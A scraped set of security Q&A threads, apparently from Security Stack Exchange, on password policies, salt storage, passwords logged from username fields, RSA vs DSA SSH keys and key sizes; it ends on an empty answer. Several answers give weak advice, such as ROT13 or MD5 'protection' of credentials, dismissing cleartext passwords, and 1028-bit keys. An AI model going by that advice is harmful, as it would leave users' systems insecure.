According to the wikipedia article on password strength (http://en.wikipedia.org/wiki/Password_strength), prohibiting characters only REALLY serves to REDUCE the desired entropy of a given password, making easier to brute-force crack.  Therefore, from a technical perspective, it appears that JetBlue's password policy actually results in a system with easier-to-hack passwords.

Unfortunately, I think all of this is merely speculation unless there's a JetBlue representative on the site who's willing to offer an official explanation of the policy...
AnswerKenntnis:
Pure speculation, but Q and Z are the least frequently occurring letters in English.  To an attacker watching a stream of input characters, perhaps from a phone on a nearby table, Q and Z could signal a randomly generated password.
AnswerKenntnis:
The reason would be to have less work for the administrator in an environment with multiple keyboard layouts.

Considering AZERTY and QWERTY keyboard layouts, all keys are the same, except Q - A, W - Z and ; - M.

Therefore it could be useful to avoid QWAZM in passwords because it makes them easier to type on different keyboard layouts.

Of course, since you would also have to enter digits and special characters, and those are all in different locations on each layouts, it might not be too useful to filter out those letters, anyways.
QuestionKenntnis:
How to store salt?
qn_description:
Nowadays, if we expect to store user password securely, we need at least do the following thing

$pwd=hash(hash($password) + salt)


then store $pwd in your system instead of the real password. I have seen some cases where $pwd contains the salt itself.

So the question is how to store the salt, should it be stored separately or is it OK if an attacker gets the hashed value and the salt the same time and why?
AnswersKenntnis
AnswerKenntnis:
TL;DR - You can store the salt in plaintext without any form of obfuscation or encryption, but don't just give it out to anyone who wants it.



The reason we use salts is to stop precomputation attacks, such as rainbow tables. These attacks involve creating a database of hashes and their plaintexts, so that hashes can be searched for and immediately reversed into plaintext.

For example*:

86f7e437faa5a7fce15d1ddcb9eaeaea377667b8 a
e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98 b
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4 c
...
948291f2d6da8e32b007d5270a0a5d094a455a02 ZZZZZX
151bfc7ba4995bfa22c723ebe7921b6ddc6961bc ZZZZZY
18f30f1ba4c62e2b460e693306b39a0de27d747c ZZZZZZ


Most tables also include a list of common passwords:

5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 password
e38ad214943daad1d64c102faec29de4afe9da3d password1
b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 letmein
5cec175b165e3d5e62c9e13ce848ef6feac81bff qwerty123


*I'm using SHA1 here as an example, but I'll explain why this is a bad idea later.

So, if my password hash is 9272d183efd235a6803f595e19616c348c275055, it would be exceedingly easy to search for it in a database and find out that the plaintext is bacon4. So, instead of spending a few hours cracking the hash (ok, in this case it'd be a few minutes on a decent GPU, but we'll talk about this later) you get the result instantly.

Obviously this is bad for security! So, we use a salt. A salt is a random unique token stored with each password. Let's say the salt is 5aP3v*4!1bN<x4i&3 and the hash is 9537340ced96de413e8534b542f38089c65edff3. Now your database of passwords is useless, because nobody has rainbow tables that include that hash. It's computationally infeasible to generate rainbow tables for every possible salt.

So now we've forced the bad guys to start cracking the hashes again. In this case, it'd be pretty easy to crack since I used a bad password, but it's still better than him being able to look it up in a tenth of a second!

Now, since the goal of the salt is only to prevent pre-generated databases from being created, it doesn't need to be encrypted or obscured in the database. You can store it in plaintext. The goal is to force the attacker to have to crack the hashes once he gets the database, instead of being able to just look them all up in a rainbow table.

However, there is one caveat. If the attacker can quietly access a salt before breaking into your database, e.g. through some script that offers the salt to anyone who asks for it, he can produce a rainbow table for that salt as easily as he could if there wasn't one. This means that he could silently take your admin account's salt and produce a nice big rainbow table, then hack into your database and immediately log in as an admin. This gives you no time to spot that a breach has occurred, and no time to take action to prevent damage, e.g. change the admin password / lock privileged accounts. This doesn't mean you should obscure your salts or attempt to encrypt them, it just means you should design your system such that the only way they can get at the salts is by breaking into the database.

One other idea to consider is a pepper. A pepper is a second salt which is constant between individual passwords, but not stored in the database. We might implement it as H(salt + password + pepper), or KDF(password + pepper, salt) for a key-derivation function - we'll talk about those later. Such a value might be stored in the code. This means that the attacker has to have access to both the database and the sourcecode in order to attempt to crack the hashes. This idea should only be used to supplement other security measures. A pepper is useful when you're worried about SQL injection attacks, where the attacker only has access to the database, but this model is (slowly) becoming less common as people move to parameterized queries. You are using parameterized queries, right? Some argue that a pepper constitutes security through obscurity, since you're only obscuring the pepper, which is somewhat true, but it's not to say that the idea is without merit.

Now we're at a situation where the attacker can brute-force each individual password hash, but can no longer search for all the hashes in a rainbow table and recover plaintext passwords immediately. So, how do we prevent brute-force attacks now?

Modern graphics cards include GPUs with hundreds of cores. Each core is very good at mathematics, but not very good at decision making. It can perform billions of calculations per second, but it's pretty awful at doing operations that require complex branching. Cryptographic hash algorithms fit into the first type of computation. As such, frameworks such as OpenCL and CUDA can be leveraged in order to massively accelerate the operation of hash algorithms. Run oclHashcat with a decent graphics card and you can compute an excess of 10,000,000,000 MD5 hashes per second. SHA1 isn't much slower, either. There are people out there with dedicated GPU cracking rigs containing 6 or more top-end graphics cards, resulting in a cracking rate of over 50 billion hashes per second for MD5. Let me put that in context: such a system can brute force an 8 character alphanumeric password in less than 4 minutes.

Clearly hashes like MD5 and SHA1 are way too fast for this kind of situation. One approach to this is to perform thousands of iterations of a cryptographic hash algorithm:

hash = H(H(H(H(H(H(H(H(H(H(H(H(H(H(H(...H(password + salt) + salt) + salt) ... )


This slows down the hash computation, but isn't perfect. Some advocate using SHA-2 family hashes, but this doesn't provide much extra security. A more solid approach is to use a key derivation function with a work factor. These functions take a password, a salt and a work factor. The work factor is a way to scale the speed of the algorithm against your hardware and security requirements:

hash = KDF(password, salt, workFactor)


The two most popular KDFs are PBKDF2 and bcrypt. PBKDF2 works by performing iterations of a keyed HMAC (though it can use block ciphers) and bcrypt works by computing and combining a large number of ciphertext blocks from the Blowfish block cipher. Both do roughly the same job. A newer variant of bcrypt called scrypt works on the same principle, but introduces a memory-hard operation that makes cracking on GPUs and FPGA-farms completely infeasible, due to memory bandwidth restrictions.

Hopefully this gives you a nice overview of the problems we face when storing passwords, and answers your question about salt storage. I highly recommend checking out the "links of interest" at the bottom of Jacco's answer for further reading, as well as these links:


The Definitive Guide to Forms-Based Website Authentication
The Open Web Application Security Project (OWASP)
Similar answer on StackOverflow
AnswerKenntnis:
A salt is not meant to be secret, instead, a salt 'works' by by making sure the hash result unique to each used instance. This is done by picking a different random salt value for each computed hash.

The intention of the salt is not compromised when it is known; the attacker still needs to attack each hash separately. Therefore, you can simply store the salt alongside the password.

Links of interest:
How to securely hash passwords?
Password Hashing add salt + pepper or is salt enough?
Salt Generation and open source software
AnswerKenntnis:
The salt can and should be stored right next to the salted and hashed password. Additionally, the salt should be unique per password.

Its purpose is to make it unfeasible to attack a leaked password database by using precomputed tables of password-hash-pairs.

That works because the salt only becomes known to the attacker as soon as he gets the actual (hardened) passwords; thereby rendering any precomputed attack impossible. (If you don't use a unique salt per password, but a global one, precomputed tables might still be used - although they would have to be precomputed specifically for your application's salt.)

When you store the salt somewhere else than right next to the password, you might gain some additional security, but it almost defeats the purpose: Every time you want to validate a password, you need both the salt and the hashed password, so they have to be very "close" (in an arichtectural sense) anyway.
AnswerKenntnis:
Storing your salts separately offers some extra security, but not much - after all, the database should be the best protected place of the application, so if the attacker has access to the database, chances are he has access to any other data. On the other hand, you need a different salt for each user, which means you need a lot of salt - it is just not feasible to store it outside the database.

There is a practice of using a second piece of salt (sometimes called pepper) which is the same for all users, and storing it outside the database (maybe in an environment variable, or some sort of configuration file), so the attacker does not get access to it with a simple SQL injection. This adds some security, but as said above, don't expect too much from it, and use bcrypt or some other slow hashing method to defend against stolen salts.
AnswerKenntnis:
I'd like to turn your attention to an interesting article on this of the title Storing Passwords Securely

It sort of reads like another excellent SExchange response to a question, one worthy mentioning on the Stack Exchange G+ page ;-)

TL;DR

The author in the article explains salting and pepper. Also, he/she argues that actually you do not want to use a cryptography hashing function for storing passwords. The two main traits of a hash are that 


it should be one-way and.  
it should be cheap to compute. 


Obviouslty these requirements go against each other. So a compromise is made. You do not want the attacker to be able to compute their brute-force tries cheaply. Therefore, for better security, you actually need a Password Hash Function, something, which takes longer to compute (eg. 0.1 s).

There are schemes/implementations how to do this, so called Adaptive Key Derivation Functions that are well studied and deemed secure (author names three: PBKDF2, bcrypt, scrypt)
AnswerKenntnis:
Well you do separate hash from salt in two different boxes - I hope you understand the correct answer. And make sure you have same amount of both, like 256bit salt, 256bit hash, you can increase security if using simple isolated salt server.
QuestionKenntnis:
Passwords Being Sent in Clear Text Due to Users' Mistake in Typing it in the Username Field
qn_description:
Upon reviewing the Logs generated by different SIEMs (Splunk, HP Logger Trial and the AlienVault platformΓÇÖs SIEM) I noticed that for some reason quite a few users tend to make the mistake of typing their passwords in the username field, either in the OS Domain logon, or within web applications. I am guessing those are people who cannot type without looking at the keyboard and in trying to do so, doing it fast, end up typing their passwords in the wrong field. This means that the password is sent in plain text everywhere in the network and end up recorded on the logs with an event that says something along the lines:

User P@$$w0rd does not exist [...]


Or

An account failed to login: P@$$w0rd [...]


(where P@$$w0rd is the actual user's password)

It becomes pretty obvious to work out to whom the passwords belong: usually the previous or very next  (un)successful event on the same log file will tell you an event triggered by the same user. 

Any other Analyst, looking at the logs, could get someone elseΓÇÖs credentials without the due owner even being aware of that; the worst case scenario is network eavesdropping, or actual log file compromise. 

I am looking for a general guidance to help preventing this. I assume simply masking the username is not feasible and even if it were, this would probably eliminate a lot of the log analysis for not being able to tell who did what....?

Note: There is already a post on a similar issue, but I am trying to address a way to prevent it.
What's the risk if I accidently type my password into a username field (Windows logon)?



Accepted Answer: I wish I could select a few answers from the list. Unfortunately I have to stick to just one in the forum, but in practice I can combine them. Thanks very much for all the answers; I see there is no single solution. As I agree that adding 'things' add complexity which increase likelihood of security holes, I have to agree with most of the voters that @AJHenderson has the most elegant and simplest answer as a first approach. Definitely SSL and a simple code verification on the server or even at the client side. As I am looking to mitigate not against malicious users, but the distracted ones, this will do fine. Once this is in place, we can start looking at expanding the implementation to ill-intended users if appropriate. Thanks ever so much again for everyone's input.
AnswersKenntnis
AnswerKenntnis:
One thought is to not allow form submission if there is not a value in the password box.  Generally if they accidentally entered the password in the username, then there likely isn't going to be anything in the password dialog.

It is worth noting that this does not have to be simply done client side, but could also be done on a server as long as the transport used is secure and the input is not logged until after passing a check about the password field not being empty.
AnswerKenntnis:
Assuming your backend application and SIEM needs to view failed login attempts to various applications (and thus show the "User P@$$w0rd is not valid" error message) then it is not going to be trivial to stop this.

However, ensuring that all applications that send sensitive data including usernames and passwords implement HTTPS (encrypted HTTP using SSL) is a good way to ensure that network devices and anyone on the network can not obtain the password that was mistakingly entered into the username box!
AnswerKenntnis:
So the problem is that you don't want analysts to see the passwords in the sensitive log files?  

Caution: Even if you were to use Javascript it doesn't deal with the password data that is stored on your disk in plain text.


  A better solution is to preprocess the logs before the analysts see them and redact information in the logs.


You can do this line-by-line filtering if you whitelist lines or blacklist other lines.  For example:

You can whitelist usernames when they appear in a log file that


Have a pattern ( [az] + number) or ([az] + period + [az])
include a Domain Name followed by a slash "\" for AD environments 
appear multiple times 
Can be washed against an LDAP directory of known usernames before the analysts see it


You also identify and blacklist passwords by:


The password policy often follows a pattern (one symbol, upper/lower, x characters...) 


You can use this knowledge to build a custom log data cleanser to protect the information you don't want analysts to see.  

So what does a filtered line look like?

You can simply redact questionable usernames by hashing them, and assigning them a human ID and storing them in a secure location:

 eb574b236133e60c989c6f472f07827b   Redact1
 7e67b89a695bfbffc05b7ed2c38f927f   Redact2
 ..etc


The analysts can see if a particular entry is occurring over and over again if the hash repeats in frequency.  

The exact hashing method (or encryption method) you choose is subject to risks since this "hash database" will contain high value information.  And seeding will (by its nature) prevent frequency analysis which may or may not be of value to you.
AnswerKenntnis:
I can only identify three problems with what you're discussing.


Users aren't inputting information correctly.
Analysts can discern passwords from logs.
Passwords are being sent in clear-text and are susceptible to man-in-the-middle eavesdropping.


In my opinion, this is fairly simple to fix.


Accept user error, grudgingly.
Don't log invalid usernames, instead log failed attempts and IP.
Don't send usernames in clear-text.  Use technology like HTTPS or use javascript to encode the plain-text (e.g. ROT13).


Example log of a failed login and then a successful retry.

[00:00:00] An account failed to login from 192.168.1.100
[00:21:00] Successful login 'root' from 192.168.1.100




Reading over other answers, I would like to include this.


Validate all fields prior to submission.
Consider breaking up the form between multiple pages as Eric G mentioned.
AnswerKenntnis:
A solution I have seen a few banks implement, at least in web apps, is to have a two page login. 


On the first page accept only the username
On the next page in the process request the password and only echo the username back so it is not an editable field 


Therefore the only input on the second page should be the password. Since the user knows they must clear the first page with a username, they know they must clear that gate, then the only option on the second page is the password. 

If you can implement this workflow, it will help focus the users on what they are typing and when.



Also, considering your logging: Maybe you can change your logging to not include actual credentials? 

E.g., On a successful login, use the primary key id instead of echoing back the input: "The user with id: '2342342' has attempted to logon" then "The user with id '2342342' has successfully provided a password". 

If you do a lookup and the username is not there, then something like "User from IP address '192.168.0.10' attempted to logon with a non-valid user id". 

This would be your app level logs. Web server logs may include query parameters, so that might be a little harder to address or maybe you can put some type of proxy filter in between the action and when the log is written to redact the log content based on certain rules. This would be platform specific, but it looks like it may be possible on Apache.

As a secondary control, limit read access to the various log files you are processing.
AnswerKenntnis:
This answer is intended to be somewhat abstract, but why not just use a AJAX call on form submit that will validate the username first, and if the JSON encoded result comes back evaluating as boolean true, then allow your form submit to proceed, otherwise return false in the Javascript code to prevent form submission from taking place.

Using jQuery:

<script>
$('#login-form').submit(function() {

    // In case you want to make login an AJAX call as well
    var form_values = $(this).serialize();

    // Get field value
    var check_username = $('#username-field-id').val();

    // POST
    var ready_to_login = false;
    $.post("check_username.php", { username: check_username }).done(function(data) {
            if(data.username_exists == true) {
                    ready_to_login = true;
            }
    });

    // If false, form will not go on to be submitted
    // Do something with ready_to_login (e.g. add status message)

    return ready_to_login;
});
</script>


Here you're validating the username field first. If the username is not found by check_username.php, then the form should not proceed any further (e.g. to prevent it from being logged, assuming it's the login procedure responsible for logging these attempts).

Also, per MrJamin's comment, you may want to consider also validating the presence of a value in both username and password fields using the required attribute as an added pre-check layer.
AnswerKenntnis:
From what you describe of your architecture, this is infeasible, but in my opinion the correct solution is: Don't send the username in the clear, and don't log usernames of failed login attempts. The only place the username and password should go is to the subsystem which checks the password; until that occurs, the username is unauthenticated, arbitrary data ΓÇö anyone with access to the login form, which in a web application is the entire Internet, can type in anything they want however often they want ΓÇö and therefore tells you very little of interest. (Unless your login form is not exposed to the Internet.)


  this would probably eliminate a lot of the log analysis for not being able to tell who did what....?


Given a username without the correct password, you don't know that the request is actually from that user, so you still don't know who did the login attempt.
AnswerKenntnis:
Generally speaking, all client Code are Smart Enough to handle Basic Errors


User ID and or Password Missing
Password not matching the Guidelines 


So in any case when you are still seeing these entries in the Log, 

User P@$$w0rd does not exit [...]
An account failed to login: P@$$w0rd [...]


None of the Client Validation worked and the System ended up sending the unencrypted password over the network. So what was in the Password Field? Definitely not blank as the Client Validation would fail. It must me something different from password

So Make it a two pass authentication


First Pass, send all encrypted details including password to the server. Verify if Password field is empty.
First Pass,  Verify if the Password matches the Guidelines else Error Out.
First Pass, next check if the password is present in your DB. If not Error Out.
Send back an RPC response to the Client and let it send the User ID and Password now.
Now perform the authentication process


The whole essence of this process is to 


Minimize risk. Note, you cannot eliminate the risk to Zero
Not trusting the Client.


And finally, get your interface reviewed by a UX Expert. It may be, your interface has some flaw causing Users to enter Password in the ID field.
AnswerKenntnis:
Client side javascript seems reasonable.  

Check password field is not empty, prior to submission.  Check that the username is in a valid form.  Especially elegant is something where the username is required to be an email address.  You could additionally forbid password at your password set/change mechanism from being in the form of an email address.  Then simply check that the username is in the form of a valid email address prior to submitting the form.  This could be done similarly with say special characters or numbers.  (E.g., numbers/special characters are required in passwords but forbidden from usernames).

Additionally, use an up-to-date library SSL for all form submissions (this should be done to prevent network eavesdroppers from listening in).  Require elevated permissions to read these logs (e.g., the webserver account can write to these logs, but only root can read them).  As soon as the password fails the authentication step, don't propagate the username to other systems.  (Also use SSL between distinct internal systems to prevent network eavesdroppers).
AnswerKenntnis:
I like the approach that my current company takes to this problem: if you type your password into the wrong box, an automated system causes your password to expire immediately.  Thus the user has to change their password, and the password that is in the log is now no longer vulnerable.

Of course, this is still not ideal if the user is still using that password for another system, but hopefully being forced to change their password will make a user more cognizant of the possible security risks.
AnswerKenntnis:
The general problem is password-based authentication. Every mom-and-pop shop insists on having own authentication with passwords. This is stupid.

Let some other identity provider do the hard work of keeping credentials secure. Do the same as StackOverflow does: allow authenticating with OpenID, Gmail, etc.

Your users will thank you for not needing yet another password somewhere.
AnswerKenntnis:
Mostly the EASIEST answer is the right answer. Now we notice that every email address has a "@" sign in it Just before the domain name. 
Making "@" a NON ACCEPTABLE key in password makes the solution pretty obvious. If the username does NOT have @ and ALL USERNAMES are email addresses, then Log only those that have atleast @ in them.

Now if the username DONOT have "@", it probably might make some users angry but this is a neat solution. That is to have ONE SINGLE special character that comes BEFORE a password. Just like ALL USERNAMES that are email accounts have a format. All answers have a special character at the start or at the end, whatever. So when the user is entering a password, you let him know that he needs to type it in.

Third solution is that COLOR CODING. Make username Field Yellow and Password Field RED. Red normally catches your attention because it is used for sensitive stuff. So even if they are looking at the keyboard, the will VERY QUICKLY LEARN that passwords are red.
So basically the textfield AND THE label of password is red preferably in a separate box and Username label and textfield ALL YELLOW.
AnswerKenntnis:
Why not just respond with this?

That username does not exist
AnswerKenntnis:
How much control do you have over the receiving server's handling of this? It seems like the solution that a user proposed above, to hash both the username and password, would be workable a couple of ways:

Method 1 (requiring JavaScript): Hash both username and password. In your database, store hashed usernames, and then do your auth lookup using that field. This would be ideal if you have some control over the way the data is treated on your server, but do not control its logging capacity.

Method 2 (not requiring JavaScript): Receive username in plaintext as usual, but convert it to a hash as in method 1 once you receive it on the server. When the attempt fails, log the hash, not the username. The logs will still be useful (slightly less useful when inspected cursorily), since each hash will still uniquely identify a user. Neither of these are as elegant as the top response here (and I would suggest using that as well), but they are more thorough.
AnswerKenntnis:
A simple, yet annoying solution could be to have a on-screen keypad layout of html buttons, where users can only type their username using these buttons, this will prevent the mistake from being made, I realize how annoying this could turn out to be, but after the first login, you could use a cookie to remember the username and not require it again. Javascript will be required of course. Now its impossible to send the password in plain text by accident. Hope it helps.
AnswerKenntnis:
I have a different take... What problem are you trying to really solve?


Bad passwords? I.e. when you see a person use "password" (or a variant) you want to be able to trace back to the user and correct it?
Passwords being sent in the clear?
Or the issue with idiots who can't type or read forms (or maybe a badly designed UI)?


Always remember that whenever you "add" to the system you are potentially adding complexity, and you are definitely adding code - both which increase the possibility you open security "holes" in your overall architecture somewhere (could be in the stack, could be via the web, could be over the net...). So in resolving any of the 3 you must measure whether the value of solving them is worth the risk of poking a hole you don't know about - the devil you know is always better than the devil you don't.

Now to each.

Resolving bad passwords should be done at the set up and change of the password via the validation rules. And only there. To add another place to do so, only means you risk getting validation rules confused or out of synch.

Passwords being sent in the clear. Who cares? Granted might "feel" unsafe, but remember this is n part authentication and if you only have 1 part it is no different than having a word in a dictionary. Maybe, just maybe if you have an active sniffer it may give them some clues, but then the intrusion already in place is your real problem, not some occasional, random, fat-fingering of passwords in the user name field. Now if you have all parts being sent in the clear, big problem.

Issue of idiots or bad UI design. Re-mediate users or UI. Simple. Provide active help on UI, have departments go through some training or something. Easy fix that requires limited, low risk coding changes (or should - be careful with the UI aspect though).

While I admire a lot of the suggestions on here, and many of them have wonderful ideas at their core. I recommend a KISS, no BS approach, always remembering that if you add to your systems you risk adding to your insecurity.

Just my 2 cents.
AnswerKenntnis:
only allow of transmitting md5 hashes of usernames AND passwords (or similar hash), so that whatever gets logged in the log files will always look like a fixed length of random characters, which will not make anyone be able to quickly guess that it is an md5 of a password or a username. 


Con: To compare with usernames in your database you have to either store two columns e.g. 'username' and 'md5(username)' OR you have to dynamically hash every time you're querying username for login. 




create a log entry only if the username exists in the database, otherwise, log ip only.





only allow the user to click enter using the mouse, not the keyboard, or only allow the keyboard after 5 seconds of last entered character in either fields, which will give the user time to look at the screen and see his mistake.





do some restriction to allowed usernames and passwords:


passwords must contain a special character like !@#$%^&*()
usernames must NOT contain any special character 



This way, you can do javascript to quickly identify whether the entered is username or password.
QuestionKenntnis:
RSA vs. DSA for SSH authentication keys
qn_description:
When generating SSH authentication keys on a Unix/Linux system with ssh-keygen, you're given the choice of creating a RSA or DSA key pair (using -t type).

What is the difference between RSA and DSA keys? What would lead someone to choose one over the other?
AnswersKenntnis
AnswerKenntnis:
Go with RSA. 

DSA is faster for signature generation but slower for validation, slower when encrypting but faster when decrypting and security can be considered equivalent compared to an RSA key of equal key length. That's the punch line, now some justification.

The security of the RSA algorithm is based on the fact that factorization of large integers is known to be "difficult", whereas DSA security is based on the discrete logarithm problem. Today the fastest known algorithm for factoring large integers is the General Number Field Sieve, also the fastest algorithm to solve the discrete logarithm problem in finite fields modulo a large prime p as specified for DSA.

Now, if the security can be deemed as equal, we would of course favour the algorithm that is faster. But again, there is no clear winner.

You may have a look at this study or, if you have OpenSSL installed on your machine, run openssl speed. You will see that DSA performs faster in generating a signature but much slower when verifying a signature of the same key length. Verification is generally what you want to be faster if you deal e.g. with a signed document. The signature is generated once - so it's fine if this takes a bit longer - but the document signature may be verified much more often by end users.

Both do support some form of encryption method, RSA out of the box and DSA using an El Gamal. DSA is generally faster in decryption but slower for encryption, with RSA it's the other way round. Again you want decryption to be faster here because one encrypted document might be decrypted many times.

In commercial terms, RSA is clearly the winner, commercial RSA certificates are much more widely deployed than DSA certificates.

But I saved the killer argument for the end: man ssh-keygen says that a DSA key has to be exactly 1024 bits long to be compliant with NIST's FIPS 186-2. So although in theory longer DSA keys are possible (FIPS 186-3 also explicitly allows them) you are still restricted to 1024 bits. And if you take the considerations of this [article], we are no longer secure with 1024 bits for either RSA or DSA. 

So today, you are better of with an RSA 2048 bit key.
AnswerKenntnis:
In SSH, on the client side, the choice between RSA and DSA does not matter much, because both offer similar security for the same key size (use 2048 bits and you will be happy).

Historically, version 1 of the SSH protocol supported only RSA keys. When version 2 was defined, RSA was still patented, so support of DSA was added, so that an opensource patent-free implementation could be made. RSA patent expired more than 10 years ago, so there is no worry now.

Theoretically, in some very specific situations, you can have a performance issue with one or the other: if the server is a very small machine (say, an i486), it will prefer clients with RSA keys, because verifying a RSA signature is less computationally expensive than verifying a DSA signature. Conversely, a DSA signature is shorter (typically 64 bytes vs 256) so if you are very short on bandwidth you would prefer DSA. Anyway, you will have a hard time detecting those effects, let alone find them important.

On the server, a DSA key is preferred, because then the key exchange will use a transient Diffie-Hellman key, which opens the road for "Perfect Forward Secrecy" (i.e. if a bad guy steals the server private key, he still cannot decrypt past connections that he would have recorded).
AnswerKenntnis:
Another important advantage of RSA over both DSA and ECDSA is that you don't ever need a secure random number generator to create signatures.

To generate a signature, (EC)DSA needs a value that has to be random, secret/unpredictable and can never be used again. If one of those properties is violated, it's possible to trivially recover the private key from one or two signatures.

This has happened before (once with a broken patch of the OpenSSL PRNG in Debian, and once with a bug in Android's SecureRandom implementation), and is pretty hard to completely prevent.

With RSA, in those situations only your ephemeral session key would have been compromised, if the actual authentication key pairs have been created using a properly seeded PRNG before.

Theoretically, there is a way to make (EC)DSA signatures depend on the message and private key, which can avoid total failure in case of a broken RNG, but until this gets integrated into your SSH client (there is no OpenSSL release version including the patch right now), I'd definitely go with RSA keys.
AnswerKenntnis:
A presentation at BlackHat 2013 suggests that significant advances have been made in solving the problems on complexity of which the strength of DSA and some other algorithms is founded, so they can be mathematically broken very soon. Moreover, the attack may be possible (but harder) to extend to RSA as well.

The presentation suggests using elliptic curve cryptography instead. The ECC algorithms supported by OpenSSH are ECDSA and, since OpenSSH 6.5, Ed25519. 

OpenSSH only supports NIST curves for ECDSA and according to this study those curves look really suspicious for NSA backdoors. And if NSA can already crack it, then it won't be as hard to crack for somebody else as a proper curve would be. Ed25519 is the same thing but with a better curve, so it's the safest bet against the underlying algorithm being mathematically broken. 

Also, DSA and ECDSA have a nasty property: they require a parameter usually called k to be completely random, secret, and unique. In practice that means that if you connect to your server from a machine with a poor random number generator and e.g. the the same k happens to be used twice, an observer of the traffic can figure out your private key. (source: Wikipedia on DSA and ECDSA, also this).

The bottom line is:


Never use DSA or ECDSA.
Ed25519 is probably the strongest mathematically (and also the fastest), but not yet widely supported. As a bonus, it has stronger encryption (password-protection) of the private key by default than other key types.
RSA is the best bet if you can't use Ed25519.
AnswerKenntnis:
RSA and DSA are two completely different algorithms.  RSA keys can go up to 4096 bits, where DSA has to be exactly 1024 bits (although OpenSSL allows for more.)  According to Bruce Schneier, "both DSA and RSA with the same length keys are just about identical in difficulty to crack."
AnswerKenntnis:
The problem with ECDSA is not so much backdoors. Bernstein/Lange specifically mention that curve cryptanalysis does not attack specific curves, but classes of curves (see slide 6).

The problem with ECDSA is that NIST curves are hard to implement correctly (ie. constant time and with all proper verification) compared to Curve25519. OpenSSL has a constant-time P256 implementation, so OpenSSH is safe in that regard. 

If you're still worried about NIST curves, OpenSSH recently added support for the Ed25519 scheme (I can't post the link due to reputation)
AnswerKenntnis:
The math might not matter. This thread seems pre-Snowden. Here is a Reuters article dated December 20, 2013:


  (Reuters) - As a key part of a campaign to embed encryption software
  that it could crack into widely used computer products, the U.S.
  National Security Agency arranged a secret $10 million contract with
  RSA, one of the most influential firms in the computer security
  industry, Reuters has learned.
  
  Documents leaked by former NSA contractor Edward Snowden show that the
  NSA created and promulgated a flawed formula for generating random
  numbers to create a "back door" in encryption products, the New York
  Times reported in September. Reuters later reported that RSA became
  the most important distributor of that formula by rolling it into a
  software tool called Bsafe that is used to enhance security in
  personal computers and many other products.
  
  Undisclosed until now was that RSA received $10 million in a deal that
  set the NSA formula as the preferred, or default, method for number
  generation in the BSafe software, according to two sources familiar
  with the contract. Although that sum might seem paltry, it represented
  more than a third of the revenue that the relevant division at RSA had
  taken in during the entire previous year, securities filings show.


During this Science Friday podcast Ira asks Matt Green, Martin Hellman (inventor of Public Key Cryptography), and Phil Zimmerman (creator of PGP) what they thing the NSA has cracked:

(around 17:26) 


  Ira: What are some of the things that we know that the NSA has broken into?
  
  Matt: So we have heard a number of things that we can probably credit for real. … random number generators … we know
  that NSA through NIST … has very likely put back doors in some
  of those standard algorithms that allow them to essentially break
  those systems entirely.
  
  Ira: You mean the NSA created those back doors?
  
  Matt: That's exactly right. So NIST works with NSA --- and they're required to by law. We thought NSA was helping NIST by developing more
  secure standards for Americans to use. We now suspect --- and have
  strong evidence to believe --- that the situation was exactly the
  opposite; that NIST was being used to put out standards that the NSA
  could break.


Considering these recent revelations the strength of the algorithms seems largely irrelevant. RSA appears to have been a private company somehow bought by the NSA and DSA was created by NIST itself, which, according to these experts is largely a front for NSA crypto research.

In other words, it really doesn't matter if you are using the random number generators that come with pretty much any modern computer, which OpenSSH and the rest do. 

Pick the one that is the fastest for what you want. In my case, I reuse the same key for a lot of stuff so DSA's faster generation speed is less desirable. Also, maybe there is some wild chance that RSA was actually an independent entity from NIST and NSA, whereas we know DSA was created by NIST.

I personally just use 1028 bit keys because, as we've seen, it really doesn't matter unless someone is placing some requirement on you who still believes bigger keys will protect you. The whole thing is largely just an annoyance to anyone seeking to break in.
QuestionKenntnis:
Why not use larger cipher keys?
qn_description:
RSA Security commonly uses keys of sizes 1024-bit, 2048-bit or even 3072-bit.  And most Symmetric algorithms only between 112-bit and 256-bit.  I do realize that the current keys are secure enough for today's hardware, but as computers get faster, should we not consider an insanely large key size like a million bits or so to protect ourselves against super computer systems that has not been invented yet?

So in other words what is the consequences of choosing a cipher key that is too large and why does everyone restrict their key sizes?
AnswersKenntnis
AnswerKenntnis:
The reason why RSA keys are so small is that:


  With every doubling of the RSA key length, decryption is 6-7 times times slower.


So this is just another of the security-convenience tradeoffs.
Here's a graph:


Source: http://www.javamex.com/tutorials/cryptography/rsa_key_length.shtml
AnswerKenntnis:
I dug out my copy of Applied Cryptography to answer this concerning symmetric crypto, 256 is plenty and probably will be for a long long time. Schneier explains;


  Longer key lengths are better, but only up to a point. AES will have 128-bit, 192-bit, and 256-bit key lengths. This is far longer than needed for the foreseeable future. In fact, we cannot even imagine a world where 256-bit brute force searches are possible. It requires some fundamental breakthroughs in physics and our understanding of the universe.
  
  One of the consequences of the second law of thermodynamics is that a certain amount of energy is necessary to represent information. To record a single bit by changing the state of a system requires an amount of energy no less than kT, where T is the absolute temperature of the system and k is the Boltzman constant. (Stick with me; the physics lesson is almost over.)
  
  Given that k = 1.38 ├ù 10ΓêÆ16┬áerg/K, and that the ambient temperature of the universe is 3.2 Kelvin, an ideal computer running at 3.2 K would consume 4.4 ├ù 10ΓêÆ16 ergs every time it set or cleared a bit. To run a computer any colder than the cosmic background radiation would require extra energy to run a heat pump.
  
  Now, the annual energy output of our sun is about 1.21 ├ù 1041 ergs. This is enough to power about 2.7 ├ù 1056 single bit changes on our ideal computer; enough state changes to put a 187-bit counter through all its values. If we built a Dyson sphere around the sun and captured all its energy for 32 years, without any loss, we could power a computer to count up to 2192. Of course, it wouldn't have the energy left over to perform any useful calculations with this counter.
  
  But that's just one star, and a measly one at that. A typical supernova releases something like 1051 ergs. (About a hundred times as much energy would be released in the form of neutrinos, but let them go for now.) If all of this energy could be channeled into a single orgy of computation, a 219-bit counter could be cycled through all of its states.
  
  These numbers have nothing to do with the technology of the devices; they are the maximums that thermodynamics will allow. And they strongly imply that brute-force attacks against 256-bit keys will be infeasible until computers are built from something other than matter and occupy something other than space.


The boldness is my own addition.

Remark: Note that this example assumes that there is a 'perfect' encryption algorithm. If you can exploit weaknesses in the algorithm, the key space might shrink and you'd end up with effectively less bits of your key.

It also assumes that the key generation is perfect - yielding 1 bit of entropy per bit of key. This is often difficult to achieve in a computational setting. An imperfect generation mechanism might yield 170 bits of entropy for a 256 bit key. In this case, if the key generation mechanism is known, the size of the brute-force space is reduced to 170 bits.

Assuming quantum computers are feasible, however, any RSA key will be broken using Shor's algorithm. (See http://security.stackexchange.com/a/37638/18064)
AnswerKenntnis:
